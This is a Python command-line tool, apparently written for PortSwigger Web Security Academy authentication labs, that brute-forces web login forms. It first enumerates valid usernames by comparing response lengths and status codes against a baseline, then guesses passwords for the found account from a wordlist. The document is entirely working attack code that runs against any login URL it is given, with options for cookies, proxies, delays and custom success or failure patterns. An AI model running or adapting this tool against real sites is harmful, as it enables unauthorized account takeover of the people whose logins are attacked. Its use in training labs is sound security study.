#!/usr/bin/env python3
"""
Two-phase login brute-forcer for PortSwigger Authentication labs.
Detects by RESPONSE LENGTH + status + optional regex (default: length).

Phase 1: try each username with one fixed password; valid username = response
         length differs from the invalid-user baseline (or matches --valid-regex).
Phase 2: brute force the password of the valid username; success = length/status
         differs from failed baseline (or matches --success-regex).

Usage:
  python3 bruteforce_login.py --url https://<id>.web-security-academy.net/login \
    --usernames usernames.txt --passwords passwords.txt --cookie "session=..."
"""
from __future__ import annotations
import argparse, re, sys, time
from pathlib import Path
import requests

def load(path):
    out, seen = [], set()
    for line in Path(path).read_text(encoding='utf-8', errors='replace').splitlines():
        s = line.strip()
        if s and s not in seen:
            seen.add(s); out.append(s)
    return out

def norm(t):
    return re.sub(r'\s+', ' ', t or '').lower()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--url', required=True)
    ap.add_argument('--usernames', required=True)
    ap.add_argument('--passwords', required=True)
    ap.add_argument('--cookie', default='')
    ap.add_argument('--user-agent', default='Mozilla/5.0 (bruteforce-tool)')
    ap.add_argument('--user-field', default='username')
    ap.add_argument('--pass-field', default='password')
    ap.add_argument('--phase', choices=['usernames','passwords','both'], default='both')
    ap.add_argument('--fixed-password', default='test')
    ap.add_argument('--username', default='')
    ap.add_argument('--fail-regex', default='', help='regex marking FAILURE')
    ap.add_argument('--valid-regex', default='', help='phase1: regex marking VALID username')
    ap.add_argument('--success-regex', default='', help='phase2: regex marking SUCCESS')
    ap.add_argument('--delay', type=float, default=0.0)
    ap.add_argument('--timeout', type=float, default=15.0)
    ap.add_argument('--all', action='store_true')
    ap.add_argument('--proxy', default='')
    args = ap.parse_args()

    users = load(args.usernames)
    pwds = load(args.passwords)
    s = requests.Session()
    s.headers.update({'User-Agent': args.user_agent})
    if args.cookie: s.headers['Cookie'] = args.cookie
    proxies = {'http':args.proxy,'https':args.proxy} if args.proxy else None
    fail_re = re.compile(args.fail_regex, re.I) if args.fail_regex else None
    valid_re = re.compile(args.valid_regex, re.I) if args.valid_regex else None
    succ_re = re.compile(args.success_regex, re.I) if args.success_regex else None

    def post(u,p):
        return s.post(args.url, data={args.user_field:u, args.pass_field:p},
                      timeout=args.timeout, allow_redirects=False, proxies=proxies)

    # baseline for phase 1: one known-invalid username
    baseline_len = None
    try:
        r0 = post('__invalid_user__', args.fixed_password)
        baseline_len = len(r0.text or '')
        print(f'[*] baseline invalid-user len={baseline_len} status={r0.status_code}', file=sys.stderr)
    except Exception as e:
        print(f'[!] baseline error: {e}', file=sys.stderr)

    # phase 1
    valid_users = []
    if args.phase in ('usernames','both') and not args.username:
        print(f'[*] PHASE 1: {len(users)} usernames (fixed pw="{args.fixed_password}")', file=sys.stderr)
        for i,u in enumerate(users,1):
            try: r = post(u, args.fixed_password)
            except Exception as e: time.sleep(1); continue
            body = r.text or ''
            if valid_re:
                ok = bool(valid_re.search(norm(body)))
            else:
                ok = (baseline_len is not None and len(body) != baseline_len) or r.status_code != r0.status_code
            if ok:
                print(f'[+] VALID USERNAME: {u} len={len(body)} status={r.status_code}', file=sys.stderr)
                valid_users.append(u)
                if not args.all: break
            elif i % 25 == 0:
                print(f'[*] {i}/{len(users)}', file=sys.stderr)
            if args.delay: time.sleep(args.delay)

    if args.phase == 'usernames':
        print('VALID: ' + (', '.join(valid_users) if valid_users else 'none'))
        return 0 if valid_users else 1

    targets = [args.username] if args.username else valid_users
    if not targets:
        print('[-] no valid username; skip phase 2', file=sys.stderr)
        return 1

    # baseline for phase 2: valid user + wrong password
    pwd_baseline = None
    try:
        rp = post(targets[0], '__wrong_pwd__')
        pwd_baseline = (len(rp.text or ''), rp.status_code)
        print(f'[*] phase2 baseline wrong-pw len={pwd_baseline[0]} status={pwd_baseline[1]}', file=sys.stderr)
    except Exception: pass

    print(f'[*] PHASE 2: {len(pwds)} passwords for {targets}', file=sys.stderr)
    hits = []
    for u in targets:
        for i,p in enumerate(pwds,1):
            try: r = post(u,p)
            except Exception: time.sleep(1); continue
            body = r.text or ''
            if succ_re:
                ok = bool(succ_re.search(norm(body)))
            elif fail_re:
                ok = not fail_re.search(norm(body))
            else:
                ok = (pwd_baseline is None or
                      (len(body), r.status_code) != pwd_baseline)
            if ok:
                loc = r.headers.get('Location','')
                print(f'[+] HIT {u}:{p} len={len(body)} status={r.status_code} {loc}', file=sys.stderr)
                hits.append((u,p,r.status_code,loc))
                if not args.all:
                    print(f'\nFOUND {u}:{p}')
                    return 0
            elif i % 25 == 0:
                print(f'[*] {u}: {i}/{len(pwds)}', file=sys.stderr)
            if args.delay: time.sleep(args.delay)
    print('HITS: ' + (', '.join(f'{u}:{p}' for u,p,_,_ in hits) if hits else 'none'))
    return 0 if hits else 1

if __name__ == '__main__':
    sys.exit(main())
